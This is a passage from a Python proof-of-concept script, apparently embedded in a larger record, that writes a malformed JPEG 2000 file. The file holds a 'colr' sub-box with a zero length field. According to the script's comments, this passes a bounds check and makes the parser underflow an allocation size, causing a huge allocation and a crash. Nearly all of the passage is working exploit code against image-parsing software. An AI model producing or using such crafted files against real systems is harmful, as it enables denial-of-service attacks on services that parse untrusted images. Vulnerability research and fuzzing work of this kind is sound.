ubBox.length - sizeof(box))\n    # With subBox.length = 0 and sizeof(box) = 8:\n    # DataBuf data(0 - 8) = DataBuf(-8)\n    # The negative value gets converted to a huge unsigned size in new[]\n    \n    f.write(struct.pack(\'>I\', 0))  # length = 0 (LESS THAN 8!)\n    f.write(b\'\\x63\\x6f\\x6c\\x72\')  # type = \'colr\' (Color Specification, 0x636f6c72)\n    \n    # Note: We write 8 bytes total for the sub-box (length + type),\n    # but claim the length is 0. This passes the upper-bound check\n    # (0 < remaining_file_size) while triggering the integer underflow\n    # in the allocation: (0 - 8) = -8\n\nprint(f"Generated malformed JP2 file at: {output_path}")\nprint("Structure:")\nprint("  - JP2 Signature box (12 bytes)")\nprint("  - File Type box (20 bytes)")\nprint("  - JP2 Header box (16 bytes total)")\nprint("    - Malformed sub-box: length=0 < 8 (triggers underflow)")\nprint("")\nprint("Trigger: DataBuf(0-8) = DataBuf(-8) -> huge allocation -> crash")\n'}
